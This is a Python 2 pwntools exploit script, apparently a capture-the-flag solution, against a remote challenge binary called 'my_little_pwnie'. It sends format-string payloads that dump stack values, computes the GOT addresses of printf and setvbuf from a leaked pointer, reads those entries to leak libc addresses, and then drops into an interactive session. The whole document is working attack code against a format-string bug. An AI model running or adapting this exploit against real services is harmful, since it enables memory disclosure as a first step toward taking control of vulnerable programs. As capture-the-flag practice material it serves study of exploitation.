from pwn import *
context.log_level="debug"
context.terminal=["terminator", "-e"]
elf_name = "./my_little_pwnie"
elf = ELF(elf_name)
elf.address = 0
context.binary=elf
#DEBUG
# libc = ELF("/glibc/x64/2.27/lib/libc-2.27.so")
# r = process("./launch.sh", shell=True)

# REMOTE
# libc = ELF("./libc.so.6")
r = remote("pwnie.zajebistyc.tf", 17003)
# r = process(elf_name)
# payload1 = "%13$p,%15$p,%34$p,%94$s"
payload1 = "%p,"*100
# gdb.attach(r)
# gdb.attach(r, '''
# b printf
# ''')

r.sendline(payload1)
response1 = r.recvline()
# i=0
# for k in response1.split(','):
#     if "4a0" in k:
#         print k
#         print i
#         break
#     i = i+1
print response1.split(',')[66]
printf_got_addr = int(response1.split(',')[66], base=16) - 0x4a0 + 0x000000000200fe0
setvbuf_got_addr = int(response1.split(',')[66], base=16) - 0x4a0 + 0x000000000200fe0 + 0x10
# raw_input("debug1")
payload2 = "%7$s%8$s" + p64(printf_got_addr) + p64(setvbuf_got_addr)
r.sendline(payload2)
r.recvrepeat(0.5)
r.interactive()